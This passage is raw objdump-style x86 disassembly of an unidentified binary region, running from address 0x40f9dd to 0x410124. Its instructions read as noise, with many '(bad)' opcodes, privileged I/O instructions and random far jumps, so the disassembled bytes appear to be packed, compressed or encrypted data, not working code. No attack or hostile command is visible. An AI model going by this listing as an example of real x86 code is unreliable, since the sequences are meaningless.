  40f9dd:	xchg   BYTE PTR [edx-0x1f830b66],bl
  40f9e3:	retf   0x4efc
  40f9e6:	retf   0x7a7d
  40f9e9:	idiv   dl
  40f9eb:	jg     0x40f9bd
  40f9ed:	(bad)  
  40f9ee:	shr    BYTE PTR [edx+ebx*2],0x8c
  40f9f2:	(bad)  
  40f9f3:	dec    edx
  40f9f4:	dec    edx
  40f9f5:	inc    esp
  40f9f6:	es in  eax,0x8e
  40f9f9:	sbb    eax,0x6f262356
  40f9fe:	cli    
  40f9ff:	sbb    BYTE PTR [edx+0x17e9b4c9],ch
  40fa05:	es dec ebx
  40fa07:	retf   0x5dc4
  40fa0a:	mov    eax,ds:0x14ae898d
  40fa0f:	arpl   WORD PTR [ecx],sp
  40fa11:	xor    dl,BYTE PTR [edi-0x39]
  40fa14:	sbb    eax,0xeca2e5f1
  40fa19:	adc    cl,BYTE PTR [ebp-0x15fedd28]
  40fa1f:	sub    al,0xc7
  40fa21:	adc    BYTE PTR [esi+0x38284e40],bh
  40fa27:	loopne 0x40f9c8
  40fa29:	mov    cl,0x72
  40fa2b:	dec    ebp
  40fa2c:	out    dx,al
  40fa2d:	sub    al,0xdc
  40fa2f:	xlat   BYTE PTR ds:[ebx]
  40fa30:	sub    ah,bh
  40fa32:	and    BYTE PTR [edx],ah
  40fa34:	jge    0x40fa89
  40fa36:	nop
  40fa37:	jl     0x40fa3b
  40fa39:	fisub  DWORD PTR [eax+0x49]
  40fa3c:	mov    edx,0x64d80d1c
  40fa41:	call   0x8fe5:0x1751f450
  40fa48:	(bad)  
  40fa49:	hlt    
  40fa4a:	iret   
  40fa4b:	push   cs
  40fa4c:	mov    ecx,0x80c69fb1
  40fa51:	cmp    ch,BYTE PTR [esi-0x60]
  40fa54:	cwde   
  40fa55:	dec    edi
  40fa56:	mov    eax,ds:0x541871ad
  40fa5b:	xchg   DWORD PTR [si+0x7f5f],esp
  40fa60:	je     0x40fada
  40fa62:	dec    ecx
  40fa63:	inc    ebx
  40fa64:	cmp    al,0xe8
  40fa66:	sbb    al,BYTE PTR [edi-0x1e]
  40fa69:	jp     0x40fa96
  40fa6b:	push   ss
  40fa6c:	sbb    al,0xe8
  40fa6e:	pop    esi
  40fa6f:	fdivp  st(6),st
  40fa71:	mov    ds:0x45ddf872,eax
  40fa76:	and    ch,BYTE PTR [edi+0x645ed8f]
  40fa7c:	or     DWORD PTR [edx+esi*1-0x12],ebx
  40fa80:	dec    eax
  40fa81:	icebp  
  40fa82:	push   ebx
  40fa83:	retf   
  40fa84:	cdq    
  40fa85:	push   edx
  40fa86:	jl     0x40fa25
  40fa88:	cmp    al,0x23
  40fa8a:	lock icebp 
  40fa8c:	stc    
  40fa8d:	push   esi
  40fa8e:	cmp    al,0x10
  40fa90:	inc    eax
  40fa91:	fiadd  DWORD PTR [ecx]
  40fa93:	in     eax,0xd2
  40fa95:	or     BYTE PTR gs:[edx],cl
  40fa98:	das    
  40fa99:	int3   
  40fa9a:	add    al,0x18
  40fa9c:	fdiv   QWORD PTR [esi+0x39]
  40fa9f:	hlt    
  40faa0:	or     eax,0x6fb78e19
  40faa5:	mov    edi,0x73544c0
  40faaa:	std    
  40faab:	pop    eax
  40faac:	iret   
  40faad:	add    BYTE PTR [edi+0x3ed33227],ch
  40fab3:	jae    0x40fab4
  40fab5:	mov    eax,edi
  40fab7:	dec    ebx
  40fab8:	push   ss
  40fab9:	sbb    al,0x64
  40fabb:	aad    0xb1
  40fabd:	jmp    0xbda:0x520edce0
  40fac4:	inc    edi
  40fac5:	jecxz  0x40fa6b
  40fac7:	jnp    0x40fa71
  40fac9:	or     eax,0x2013b2fa
  40face:	stc    
  40facf:	fcomp  DWORD PTR [edi]
  40fad1:	dec    ebp
  40fad2:	add    DWORD PTR [ebx+0x13f15819],esp
  40fad8:	jne    0x40fa77
  40fada:	jp     0x40fb54
  40fadc:	inc    esi
  40fadd:	push   cs
  40fade:	pop    esi
  40fadf:	cmp    dh,BYTE PTR [edi+edx*8-0x3416c77a]
  40fae6:	lea    ebx,[esp+edx*2-0x7a]
  40faea:	pushf  
  40faeb:	xchg   BYTE PTR [esi-0x46],bh
  40faee:	imul   eax,ebx,0x426502ea
  40faf4:	pushf  
  40faf5:	aaa    
  40faf6:	xor    esi,esi
  40faf8:	pop    ecx
  40faf9:	pop    edi
  40fafa:	sbb    ebx,ecx
  40fafc:	jnp    0x40fb4f
  40fafe:	ins    DWORD PTR es:[edi],dx
  40faff:	mov    ch,0xb8
  40fb01:	mov    ds:0xfde859d7,al
  40fb06:	(bad)
  40fb0b:	nop
  40fb0c:	xor    ecx,edi
  40fb0e:	mov    esp,0x957009d1
  40fb13:	jl     0x40fb78
  40fb15:	nop
  40fb16:	fcom   DWORD PTR [esi]
  40fb18:	mov    bl,0xb
  40fb1a:	inc    ebx
  40fb1b:	test   eax,0xdd40bc62
  40fb20:	repz popa 
  40fb22:	dec    BYTE PTR ds:0xfc5bf4d3
  40fb28:	sti    
  40fb29:	dec    ecx
  40fb2a:	push   ss
  40fb2b:	fidiv  WORD PTR [edx-0x6a5fc115]
  40fb31:	and    bh,BYTE PTR [esi-0x56]
  40fb34:	test   eax,0xfe7a62b1
  40fb39:	pop    esi
  40fb3a:	loop   0x40fb1e
  40fb3c:	cli    
  40fb3d:	out    0xfa,al
  40fb3f:	clc    
  40fb40:	jo     0x40facf
  40fb42:	push   0x95cf4ad3
  40fb47:	push   ss
  40fb48:	and    eax,0x510f734a
  40fb4d:	adc    ebx,esp
  40fb4f:	push   es
  40fb50:	dec    eax
  40fb51:	cwde   
  40fb52:	jae    0x40fb28
  40fb54:	xor    al,BYTE PTR [edx-0x2de7cede]
  40fb5a:	arpl   WORD PTR [esi],sp
  40fb5c:	mov    edx,0xd57e5051
  40fb61:	sti    
  40fb62:	test   eax,0x1c45c157
  40fb67:	xchg   ebp,eax
  40fb68:	repz push edi
  40fb6a:	scas   eax,DWORD PTR es:[edi]
  40fb6b:	out    dx,al
  40fb6c:	les    edx,FWORD PTR [esp+eax*1]
  40fb6f:	push   esi
  40fb70:	mov    edi,0x1fd9d0e7
  40fb75:	push   ds
  40fb76:	xchg   esi,eax
  40fb77:	je     0x40fbad
  40fb79:	fstp   DWORD PTR [eax+0x20]
  40fb7c:	inc    ecx
  40fb7d:	dec    ebp
  40fb7e:	push   ds
  40fb7f:	jmp    0x4d4235b6
  40fb84:	psubsb mm5,mm3
  40fb87:	jne    0x40fb96
  40fb89:	add    DWORD PTR [edi+0x49],0xffffffbf
  40fb8d:	sbb    edx,DWORD PTR [ebx-0x2d]
  40fb90:	fwait
  40fb91:	xchg   esi,eax
  40fb92:	pop    ss
  40fb93:	jecxz  0x40fb36
  40fb95:	(bad)  
  40fb96:	(bad)  
  40fb98:	(bad)  
  40fb99:	into   
  40fb9a:	pop    ebp
  40fb9b:	lds    esi,FWORD PTR [edi+ebx*2-0x76282620]
  40fba2:	adc    eax,0x977b705
  40fba7:	mov    ?,ecx
  40fba9:	mov    eax,ds:0xb0dcf0f4
  40fbae:	add    edx,DWORD PTR [ebx+0x60720034]
  40fbb4:	sar    DWORD PTR [ebx],0x1c
  40fbb7:	or     edx,esp
  40fbb9:	sub    BYTE PTR [ebx-0x48],0x70
  40fbbd:	mov    ah,0xee
  40fbbf:	sub    dh,BYTE PTR [ebx]
  40fbc1:	add    ecx,DWORD PTR [esi+0x252a35ec]
  40fbc7:	xor    BYTE PTR [ecx-0x6547bc4c],al
  40fbcd:	add    dh,cl
  40fbcf:	inc    ecx
  40fbd0:	arpl   WORD PTR [eax+eiz*4],bp
  40fbd3:	aas    
  40fbd4:	sbb    BYTE PTR [ecx+0x1a74ae8a],al
  40fbda:	pop    ds
  40fbdb:	clc    
  40fbdc:	imul   eax,DWORD PTR fs:[ebx-0x6b],0x2b
  40fbe1:	adc    al,0xdd
  40fbe3:	cmp    dh,BYTE PTR [edx+ebx*2]
  40fbe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe7:	shl    DWORD PTR [edx-0x73926de8],0x5c
  40fbee:	das    
  40fbef:	gs dec esp
  40fbf1:	fisttp WORD PTR [ebx]
  40fbf3:	add    eax,0xbdf7059f
  40fbf8:	fmulp  st(7),st
  40fbfa:	sub    ebp,esi
  40fbfc:	shl    al,0xa7
  40fbff:	or     DWORD PTR [ecx+0x744360f5],ebp
  40fc05:	add    DWORD PTR [ebx-0x3b],ebp
  40fc08:	(bad)
  40fc0b:	mov    ecx,0x95c42180
  40fc10:	sbb    ebx,ecx
  40fc12:	test   al,0xa1
  40fc14:	jno    0x40fc71
  40fc16:	pop    eax
  40fc17:	loopne 0x40fba1
  40fc19:	(bad)  
  40fc1b:	cmp    BYTE PTR [edi],bl
  40fc1d:	xchg   DWORD PTR ds:0xf31bb496,ebp
  40fc23:	ins    BYTE PTR es:[edi],dx
  40fc24:	std    
  40fc25:	adc    DWORD PTR [esi+0x66],0x9f4b56e3
  40fc2c:	or     DWORD PTR [ebp+0x1f],eax
  40fc2f:	xor    al,0xdf
  40fc31:	outs   dx,DWORD PTR ds:[esi]
  40fc32:	push   eax
  40fc33:	aaa    
  40fc34:	and    eax,0x8e81966e
  40fc39:	add    al,0x39
  40fc3b:	jno    0x40fc5d
  40fc3d:	xchg   ecx,eax
  40fc3e:	mov    dl,0x22
  40fc40:	icebp  
  40fc41:	outs   dx,BYTE PTR ds:[esi]
  40fc42:	in     al,dx
  40fc43:	ret    
  40fc44:	sbb    DWORD PTR [edi-0x4dfcf69f],esp
  40fc4a:	popa   
  40fc4b:	mov    DWORD PTR [ecx+eiz*4-0x6c1d9f26],edi
  40fc52:	into   
  40fc53:	cmp    esp,esi
  40fc55:	std    
  40fc56:	mov    fs,ecx
  40fc58:	jbe    0x40fc2f
  40fc5a:	in     al,0x68
  40fc5c:	add    eax,0x5662f5f9
  40fc61:	lock push eax
  40fc63:	(bad)  
  40fc64:	dec    eax
  40fc65:	sbb    BYTE PTR [esi],ch
  40fc67:	cmp    eax,0x596e24e2
  40fc6c:	(bad)  
  40fc6d:	fild   QWORD PTR [edi+edx*8]
  40fc70:	pop    edx
  40fc71:	jg     0x40fc3d
  40fc73:	push   ss
  40fc74:	mov    ecx,0x76e7bf32
  40fc79:	and    eax,0x38c6fa64
  40fc7e:	inc    ecx
  40fc7f:	cmp    al,0x20
  40fc81:	sbb    BYTE PTR [ebp-0x3b],0x62
  40fc85:	or     ebx,eax
  40fc87:	in     eax,0xfd
  40fc89:	xor    al,0xd3
  40fc8b:	or     eax,esp
  40fc8d:	or     al,BYTE PTR [edx]
  40fc8f:	bound  ebx,QWORD PTR [eax]
  40fc91:	sbb    BYTE PTR [edx-0x1d],ch
  40fc94:	push   edx
  40fc95:	ja     0x40fc3a
  40fc97:	and    DWORD PTR [ebx],edx
  40fc99:	les    esi,FWORD PTR [ebx-0x217f33db]
  40fc9f:	sub    al,0x45
  40fca1:	inc    ebp
  40fca2:	mov    bl,0xf1
  40fca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fca5:	mov    cl,0xdc
  40fca7:	xchg   ecx,eax
  40fca8:	dec    esi
  40fca9:	fnsave [ebx-0x3d3c1d0a]
  40fcaf:	xchg   ebp,eax
  40fcb0:	and    cl,BYTE PTR [ebp+0x79]
  40fcb3:	sbb    eax,0x1d781479
  40fcb8:	repz loope 0x40fce8
  40fcbb:	aaa    
  40fcbc:	cli    
  40fcbd:	sub    edi,DWORD PTR [ebx-0x786472cb]
  40fcc3:	pop    edx
  40fcc4:	cmc    
  40fcc5:	ins    DWORD PTR es:[edi],dx
  40fcc6:	mov    al,0x43
  40fcc8:	lahf   
  40fcc9:	cmp    eax,0xd86daaf4
  40fcce:	ficom  DWORD PTR [ecx+0x38]
  40fcd1:	ret    
  40fcd2:	push   cs
  40fcd3:	dec    edi
  40fcd4:	or     al,0xa1
  40fcd6:	loope  0x40fd38
  40fcd8:	mov    BYTE PTR [esi-0x29],dl
  40fcdb:	fistp  DWORD PTR [edi]
  40fcdd:	add    al,0x70
  40fcdf:	jnp    0x40fd11
  40fce1:	clc    
  40fce2:	cmp    DWORD PTR [eax+0x76e226cd],eax
  40fce8:	pusha  
  40fce9:	and    eax,0xa0e9117b
  40fcee:	or     eax,0x758569b2
  40fcf3:	ins    DWORD PTR es:[edi],dx
  40fcf4:	pop    edi
  40fcf5:	stc    
  40fcf6:	adc    DWORD PTR [ecx-0x4c],edx
  40fcf9:	les    edi,FWORD PTR [edx-0x22cae8f2]
  40fcff:	(bad)
  40fd03:	pop    ebx
  40fd04:	jns    0x40fc8e
  40fd06:	lock push edi
  40fd08:	retf   
  40fd09:	cmp    al,0xe3
  40fd0b:	enter  0x33c3,0x9d
  40fd0f:	cmp    BYTE PTR [esi],dh
  40fd11:	fdiv   DWORD PTR [edi]
  40fd13:	xor    BYTE PTR [edi+0x48],dh
  40fd16:	sbb    al,0x5
  40fd18:	lahf   
  40fd19:	jbe    0x40fd84
  40fd1b:	mov    cl,ch
  40fd1d:	xor    al,0x6b
  40fd1f:	inc    esp
  40fd21:	stc    
  40fd22:	xor    al,BYTE PTR [esi]
  40fd24:	xchg   ecx,eax
  40fd25:	adc    BYTE PTR [ebx+0x3da62288],ch
  40fd2b:	add    BYTE PTR ds:0xefe93fbf,0x22
  40fd32:	(bad)  [ebp-0x55adb923]
  40fd38:	mov    esp,DWORD PTR [eax+eax*1]
  40fd3b:	jmp    0x40fd8f
  40fd3d:	les    esp,FWORD PTR [eax]
  40fd3f:	add    al,0xb6
  40fd41:	pop    es
  40fd42:	clc    
  40fd43:	jg     0x40fd0b
  40fd45:	push   edi
  40fd46:	in     al,0x73
  40fd48:	pop    esp
  40fd49:	ds jp  0x40fd7f
  40fd4c:	pusha  
  40fd4d:	sub    BYTE PTR [esi],bl
  40fd4f:	out    0x97,al
  40fd51:	stc    
  40fd52:	fcmovne st,st(4)
  40fd54:	xchg   ah,dh
  40fd56:	xor    al,0x7f
  40fd58:	ins    DWORD PTR es:[edi],dx
  40fd59:	sub    esp,DWORD PTR [ecx-0x2b]
  40fd5c:	push   0xffffffac
  40fd5e:	jmp    0x977db0a7
  40fd63:	scas   al,BYTE PTR es:[edi]
  40fd64:	dec    ecx
  40fd65:	jbe    0x40fdd1
  40fd67:	mov    cl,0xec
  40fd69:	and    ebx,DWORD PTR ds:0x44ee5150
  40fd6f:	xor    ecx,DWORD PTR [ebx]
  40fd71:	cmp    edi,ecx
  40fd73:	push   cs
  40fd74:	pop    edx
  40fd75:	repz dec ebx
  40fd77:	cmp    bl,BYTE PTR [eax-0x3c13177]
  40fd7d:	push   esp
  40fd7e:	push   cs
  40fd7f:	retf   0xfee0
  40fd82:	push   ebp
  40fd83:	ds (bad) 
  40fd85:	fwait
  40fd86:	dec    edi
  40fd87:	mov    cl,0xa3
  40fd89:	cmp    edx,esi
  40fd8b:	or     esi,ebx
  40fd8d:	ror    edi,1
  40fd8f:	mov    bl,0xed
  40fd91:	push   0xf935e254
  40fd96:	outs   dx,DWORD PTR ds:[esi]
  40fd97:	sar    BYTE PTR [edx+0x55],1
  40fd9a:	fisttp WORD PTR [eax+0x5c416722]
  40fda0:	rcr    DWORD PTR [esi+ebp*8],0xa
  40fda4:	out    0xa8,eax
  40fda6:	add    BYTE PTR ss:[ecx+esi*4],bl
  40fdaa:	mov    esi,0x127a5c5
  40fdaf:	pop    edx
  40fdb0:	xor    eax,0xafa380ea
  40fdb5:	loopne 0x40fe25
  40fdb7:	jbe    0x40fdeb
  40fdb9:	dec    ebp
  40fdba:	pop    edi
  40fdbb:	scas   al,BYTE PTR es:[edi]
  40fdbc:	fdiv   QWORD PTR [esi]
  40fdbe:	call   0x4128:0x36e38d9e
  40fdc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc6:	sar    DWORD PTR [edx+0x5760e001],0x17
  40fdcd:	in     eax,dx
  40fdce:	and    DWORD PTR [edi],esi
  40fdd0:	and    esi,DWORD PTR [edi]
  40fdd2:	dec    esi
  40fdd3:	mov    gs,edx
  40fdd5:	lods   al,BYTE PTR ds:[esi]
  40fdd6:	dec    ebp
  40fdd7:	adc    eax,0x47a6c26c
  40fddc:	fcomip st,st(2)
  40fdde:	fisttp QWORD PTR [edi+0x5adc85fb]
  40fde4:	popa   
  40fde5:	jnp    0x40fe3f
  40fde7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde8:	push   edi
  40fde9:	adc    al,0x1
  40fdeb:	cs jo  0x40fd85
  40fdee:	ins    DWORD PTR es:[edi],dx
  40fdef:	(bad)
  40fdf3:	js     0x40fe44
  40fdf5:	or     BYTE PTR [ebx],ch
  40fdf7:	mov    eax,0x6bb91919
  40fdfc:	pop    ebp
  40fdfd:	mul    DWORD PTR [ebx+ebp*4+0x2c9cf5]
  40fe04:	bound  edi,QWORD PTR [eax+eiz*1-0x2a]
  40fe08:	sti    
  40fe09:	sti    
  40fe0a:	ins    DWORD PTR es:[edi],dx
  40fe0b:	sbb    BYTE PTR [eax],bl
  40fe0d:	inc    edi
  40fe0e:	adc    eax,0x70833635
  40fe13:	and    al,0x57
  40fe15:	mov    BYTE PTR [ebx+0x4e],al
  40fe18:	and    dh,bl
  40fe1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe1b:	nop
  40fe1c:	pop    edi
  40fe1d:	add    BYTE PTR [ebp-0x45],bl
  40fe20:	fist   DWORD PTR [eax+edx*4+0x654c49ac]
  40fe27:	cmp    DWORD PTR [ebx],ebp
  40fe29:	push   0xffffffcc
  40fe2b:	leave  
  40fe2c:	repz and DWORD PTR [ecx-0xa],ecx
  40fe30:	add    eax,0x55fa2570
  40fe35:	je     0x40feae
  40fe37:	xchg   ebx,eax
  40fe38:	push   ecx
  40fe39:	mov    ah,0xdc
  40fe3b:	(bad)  
  40fe3c:	and    cl,dh
  40fe3e:	or     al,0xe1
  40fe40:	jo     0x40fea2
  40fe42:	cmp    DWORD PTR [ecx+0x74d778c9],0x8cfd97b4
  40fe4c:	add    ch,BYTE PTR [ecx]
  40fe4e:	and    ecx,DWORD PTR [ecx]
  40fe50:	pop    esi
  40fe51:	adc    BYTE PTR [esp+ebp*1+0x2933ace6],bh
  40fe58:	xchg   esi,eax
  40fe59:	fld    QWORD PTR [ecx-0x73]
  40fe5c:	mov    DWORD PTR [ecx+0x71],ecx
  40fe5f:	mov    ecx,0x18a6f0e2
  40fe64:	mov    esp,0x570f279f
  40fe69:	(bad)  
  40fe6a:	xor    eax,ebp
  40fe6c:	outs   dx,BYTE PTR ds:[esi]
  40fe6d:	xlat   BYTE PTR ds:[ebx]
  40fe6e:	xlat   BYTE PTR ds:[ebx]
  40fe6f:	push   ecx
  40fe70:	inc    esi
  40fe71:	push   edx
  40fe72:	pop    eax
  40fe73:	(bad)  
  40fe74:	pop    ds
  40fe75:	xchg   BYTE PTR [eax+0x5c5ddbc9],dl
  40fe7b:	jb     0x40fef1
  40fe7d:	add    ch,BYTE PTR [edx+ebp*8+0x48]
  40fe81:	push   ds
  40fe82:	in     al,dx
  40fe83:	push   ebx
  40fe84:	mov    esi,0x7a687c4c
  40fe89:	icebp  
  40fe8a:	or     eax,0xa84a6696
  40fe8f:	sub    DWORD PTR [edi],esp
  40fe91:	jmp    FWORD PTR [ebx+0x751c681d]
  40fe97:	jns    0x40ff0a
  40fe99:	rol    DWORD PTR [eax+esi*1+0xaccc875],cl
  40fea0:	xor    DWORD PTR [edi+0x69],ebx
  40fea3:	push   ss
  40fea4:	or     DWORD PTR [ecx],esp
  40fea6:	push   0xea01e4b5
  40feab:	adc    cl,BYTE PTR [edi]
  40fead:	hlt    
  40feae:	fcmovne st,st(5)
  40feb0:	lods   eax,DWORD PTR ds:[esi]
  40feb1:	mov    ch,0x15
  40feb3:	jo     0x40fea3
  40feb5:	icebp  
  40feb6:	(bad)  
  40feb7:	push   cs
  40feb8:	(bad)
  40febb:	dec    ecx
  40febc:	adc    BYTE PTR [edx-0x1aecb1e4],cl
  40fec2:	addr16 mov eax,0x1e91942e
  40fec9:	(bad)  
  40feca:	pusha  
  40fecb:	jg     0x40feac
  40fecd:	or     eax,DWORD PTR [esi+0x48911f5d]
  40fed3:	popa   
  40fed4:	jp     0x40ff4f
  40fed6:	push   cs
  40fed7:	inc    edi
  40fed8:	jae    0x40ff46
  40feda:	sbb    al,0x68
  40fedc:	hlt    
  40fedd:	popf   
  40fede:	mov    bh,0xab
  40fee0:	inc    ebx
  40fee1:	and    BYTE PTR [ebp-0x3450294e],dh
  40fee7:	outs   dx,DWORD PTR ds:[esi]
  40fee8:	clts   
  40feea:	mul    DWORD PTR [ebp+0x2431592]
  40fef0:	outs   dx,DWORD PTR ds:[esi]
  40fef1:	cmp    bh,dh
  40fef3:	xchg   ebx,eax
  40fef4:	lds    ecx,FWORD PTR [esi+0x65]
  40fef7:	mov    edi,0xb2470760
  40fefc:	test   DWORD PTR [edx],esi
  40fefe:	jns    0x40ff4f
  40ff00:	ret    
  40ff01:	aam    0xf0
  40ff03:	jne    0x40ff1c
  40ff05:	jmp    0x7c92:0x81e0042c
  40ff0c:	sahf   
  40ff0d:	enter  0xec91,0x19
  40ff11:	xor    al,0x26
  40ff13:	pusha  
  40ff14:	ja     0x40ff50
  40ff16:	pop    ss
  40ff17:	mov    al,0xb2
  40ff19:	jmp    0x9d30:0x6a323732
  40ff20:	adc    edx,edx
  40ff22:	sub    BYTE PTR [eax-0xc],bl
  40ff25:	pop    ss
  40ff26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff27:	imul   edx,DWORD PTR [ebx+esi*4],0xea38a50b
  40ff2e:	fisttp QWORD PTR [ecx-0xbb1ec5e]
  40ff34:	push   esp
  40ff35:	mov    BYTE PTR [ebp+0xf968346],cl
  40ff3b:	push   es
  40ff3c:	push   0xb257ae6a
  40ff41:	fisttp DWORD PTR [ecx]
  40ff43:	sbb    BYTE PTR [edx+ebx*2],dl
  40ff46:	jmp    0x838e8968
  40ff4b:	ret    
  40ff4c:	and    al,0xbd
  40ff4e:	fld    DWORD PTR [ebx-0x44516189]
  40ff54:	and    al,0x27
  40ff56:	or     al,0x3d
  40ff58:	dec    ecx
  40ff59:	mov    BYTE PTR [ecx-0x386f3bff],0x56
  40ff60:	lods   eax,DWORD PTR ds:[esi]
  40ff61:	stc    
  40ff62:	mov    ebx,0x816a52e
  40ff67:	je     0x40ffab
  40ff69:	cmp    eax,0x6ea5a9c0
  40ff6e:	fbstp  TBYTE PTR [ebx-0xa]
  40ff71:	call   0x8605ff50
  40ff76:	sbb    DWORD PTR [eax+0x4fb87f52],edi
  40ff7c:	and    al,0x1f
  40ff7e:	cmp    DWORD PTR [eax+0x1e],ecx
  40ff81:	xchg   ecx,eax
  40ff82:	addr16 clc 
  40ff84:	rcr    BYTE PTR [ecx+0x57],cl
  40ff87:	inc    edi
  40ff88:	es inc ecx
  40ff8a:	xlat   BYTE PTR ds:[ebx]
  40ff8b:	mov    edx,0x8df921fd
  40ff90:	push   ebx
  40ff91:	dec    esi
  40ff92:	hlt    
  40ff93:	xchg   ecx,eax
  40ff94:	outs   dx,BYTE PTR ds:[esi]
  40ff95:	lods   al,BYTE PTR ds:[esi]
  40ff96:	(bad)  
  40ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff98:	aaa    
  40ff99:	addr16 mov ch,0x50
  40ff9c:	lahf   
  40ff9d:	daa    
  40ff9e:	ds pop esi
  40ffa0:	dec    esi
  40ffa1:	js     0x40ff94
  40ffa3:	adc    al,0xe5
  40ffa5:	mov    esi,0x41ff305a
  40ffaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffab:	les    eax,FWORD PTR [ebx]
  40ffad:	xchg   edx,eax
  40ffae:	push   0xffffffcd
  40ffb0:	jbe    0x40ff9d
  40ffb2:	jmp    0x410013
  40ffb4:	in     eax,0x74
  40ffb6:	ins    DWORD PTR es:[edi],dx
  40ffb7:	test   al,0x6f
  40ffb9:	pop    ebp
  40ffba:	fldenv [esi+0x7bb46e31]
  40ffc0:	out    0x9e,eax
  40ffc2:	xchg   esi,eax
  40ffc3:	mov    ebx,0xc9a2305c
  40ffc8:	shr    edx,1
  40ffca:	push   cs
  40ffcb:	sbb    BYTE PTR [esi],0x69
  40ffce:	popf   
  40ffcf:	clc    
  40ffd0:	js     0x40ff52
  40ffd2:	enter  0x73da,0x2a
  40ffd6:	clc    
  40ffd7:	fld    QWORD PTR [edx]
  40ffd9:	push   cs
  40ffda:	mov    ah,0x9f
  40ffdc:	mov    bh,bh
  40ffde:	cmp    eax,0x48bd59e2
  40ffe3:	sbb    al,0xb
  40ffe5:	ins    DWORD PTR es:[edi],dx
  40ffe6:	cmp    ch,BYTE PTR [eax+0x60de5c7]
  40ffec:	loop   0x40ff78
  40ffee:	test   DWORD PTR [edi+eax*8-0x62],ecx
  40fff2:	dec    eax
  40fff3:	jbe    0x40ff99
  40fff5:	lea    ebx,[eax]
  40fff7:	fiadd  WORD PTR [esi]
  40fff9:	mov    eax,0x82ea4351
  40fffe:	outs   dx,BYTE PTR ds:[esi]
  40ffff:	push   esp
  410000:	hlt    
  410001:	in     eax,0x66
  410003:	and    ebx,DWORD PTR [ebx+ebp*2]
  410006:	inc    edx
  410007:	mov    ah,0x79
  410009:	sub    esi,DWORD PTR [ebp+0x49]
  41000c:	rol    BYTE PTR [ecx],1
  41000e:	lds    esi,FWORD PTR [esi+ebx*4-0x7f49db03]
  410015:	sbb    ecx,DWORD PTR [edi+0xc879ef4]
  41001b:	out    dx,al
  41001c:	jg     0x41001e
  41001e:	mov    eax,0xfdacf5da
  410023:	js     0x40ffd8
  410025:	push   0x50
  410027:	jb     0x410056
  410029:	aaa    
  41002a:	rol    DWORD PTR [eax+0x52e76d18],cl
  410030:	or     al,0x18
  410032:	add    DWORD PTR [ecx+0x3c],ebp
  410035:	jb     0x41000c
  410037:	dec    ebx
  410038:	in     al,0x13
  41003a:	xchg   ebx,eax
  41003b:	loop   0x4100b2
  41003d:	shl    DWORD PTR [ebx+edx*4],cl
  410040:	push   ss
  410041:	test   DWORD PTR ds:0xa46ac109,esp
  410047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410048:	outs   dx,DWORD PTR ds:[esi]
  410049:	jne    0x40ffd0
  41004b:	xlat   BYTE PTR ds:[ebx]
  41004c:	arpl   WORD PTR [ecx+eiz*2-0x41],si
  410050:	in     al,0xfe
  410052:	pop    ds
  410053:	imul   ecx,DWORD PTR [ebx],0x84313a7d
  410059:	mov    ebx,0xc90de007
  41005e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41005f:	jle    0x41003a
  410061:	dec    eax
  410062:	xchg   cl,cl
  410064:	out    0xab,al
  410066:	ret    0x8258
  410069:	std    
  41006a:	cmp    ebp,DWORD PTR [eax+0x22804b7b]
  410070:	fs test al,0xfe
  410073:	je     0x410009
  410075:	test   BYTE PTR [ebp+0x328d7caa],ah
  41007b:	pusha  
  41007c:	adc    BYTE PTR [ecx+edx*8-0x5f0f606f],dh
  410083:	jb     0x410051
  410085:	xlat   BYTE PTR cs:[ebx]
  410087:	xor    dl,BYTE PTR [ebx+0x3f3bebc9]
  41008d:	imul   edi,esp,0xee7139b2
  410093:	lea    esi,[ecx]
  410095:	push   esi
  410096:	hlt    
  410097:	sbb    bh,BYTE PTR [eax+0x7a]
  41009a:	leave  
  41009b:	test   al,0xa9
  41009d:	xchg   ebp,eax
  41009e:	retf   
  41009f:	fld    TBYTE PTR es:[ebx]
  4100a2:	inc    esi
  4100a3:	inc    BYTE PTR [ecx]
  4100a5:	dec    ebx
  4100a6:	mov    cl,0xae
  4100a8:	xchg   DWORD PTR [ecx-0x10],edx
  4100ab:	push   ecx
  4100ac:	rol    BYTE PTR [edi+edx*1-0x5a],cl
  4100b0:	cli    
  4100b1:	imul   esi,DWORD PTR [eax+0x2f],0xffffffaf
  4100b5:	or     esi,ebx
  4100b7:	aam    0x5
  4100b9:	mov    dh,0xe3
  4100bb:	lds    ecx,FWORD PTR ds:0x770e0794
  4100c1:	push   0xffffff8d
  4100c3:	xchg   edi,eax
  4100c4:	outs   dx,BYTE PTR ds:[esi]
  4100c5:	mov    bl,BYTE PTR [ebx+0x16]
  4100c8:	fcom   st(0)
  4100ca:	fidivr DWORD PTR [ecx-0x4d]
  4100cd:	mov    al,ds:0x509d6751
  4100d2:	icebp  
  4100d3:	cs pusha 
  4100d5:	ror    BYTE PTR [ebx],0x6d
  4100d8:	push   es
  4100d9:	fisttp QWORD PTR [edx-0x4]
  4100dc:	inc    ebx
  4100dd:	into   
  4100de:	jge    0x41014e
  4100e0:	test   BYTE PTR [ebx],bh
  4100e2:	int3   
  4100e3:	sub    al,0x99
  4100e5:	je     0x410150
  4100e7:	add    dl,BYTE PTR [ecx]
  4100e9:	or     DWORD PTR [esi-0x76b0190d],esi
  4100ef:	sti    
  4100f0:	lods   eax,DWORD PTR ds:[esi]
  4100f1:	mov    ds:0x498cdc74,al
  4100f6:	pop    ds
  4100f7:	retf   
  4100f8:	ds jmp 0xdfd1:0x4498980e
  410100:	loope  0x410097
  410102:	fdiv   DWORD PTR [eax]
  410104:	add    al,0x85
  410106:	into   
  410107:	or     cl,BYTE PTR [edx-0x550c82d5]
  41010d:	rcr    DWORD PTR [esi+ebp*1],cl
  410110:	push   ecx
  410111:	mov    esp,0xabe5b2ff
  410116:	pop    esp
  410117:	sub    bl,dh
  410119:	loope  0x410114
  41011b:	xchg   esp,eax
  41011c:	and    ah,dl
  41011e:	js     0x41011e
  410120:	cld    
  410121:	stos   DWORD PTR es:[edi],eax
  410122:	mov    ch,0x8d
  410124:	push   es
